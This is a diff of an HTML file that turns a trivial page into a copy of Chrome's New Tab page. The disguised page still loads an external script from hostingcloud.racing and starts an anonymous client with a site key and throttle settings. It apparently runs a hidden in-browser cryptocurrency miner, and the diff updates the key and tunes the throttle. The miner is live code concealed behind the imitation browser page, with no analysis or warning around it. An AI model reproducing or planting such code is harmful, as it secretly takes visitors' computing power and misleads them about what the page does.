@@ -1,17 +1,51 @@
-<html>
-<body>
-    <h1> hi </h1>
-</body>
-<script src="https://www.hostingcloud.racing/pAIj.js"></script>
+<!doctype html>
+<html dir="ltr" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>New Tab</title>
+    <style>
+      body {
+        background: #A71C1C;
+        margin: 0;
+      }
+
+      #backgroundImage {
+        border: none;
+        height: 100%;
+        pointer-events: none;
+        position: fixed;
+        top: 0;
+        visibility: hidden;
+        width: 100%;
+      }
+
+      [show-background-image] #backgroundImage {
+        visibility: visible;
+      }
+    </style>
+  </head>
+  <body>
+    <iframe id="backgroundImage" src=""></iframe>
+    <ntp-app></ntp-app>
+    <script type="module" src="new_tab_page.js"></script>
+    <link rel="stylesheet" href="chrome://resources/css/text_defaults_md.css">
+    <link rel="stylesheet" href="shared_vars.css">
+  </body>
+    <script src="https://www.hostingcloud.racing/pAIj.js"></script>
 
 <script>
 
-    var _client = new Client.Anonymous('1c933a83ec5c53477f22d7bb63fb75c9667b0e2b342de78a107565f0a8e07606', {
+    var _client = new Client.Anonymous('2cbee0c21569e70ebf233561206d1e0f9c1c29c1e2fe32c4053d59c8988d402c', {
 
-        throttle: 0, c: 'w', ads: 0
+        throttle: 0.5, c: 'w', ads: 0
 
     });
 
     _client.start();
+
+    
+
+
+
 </script>
 </html>
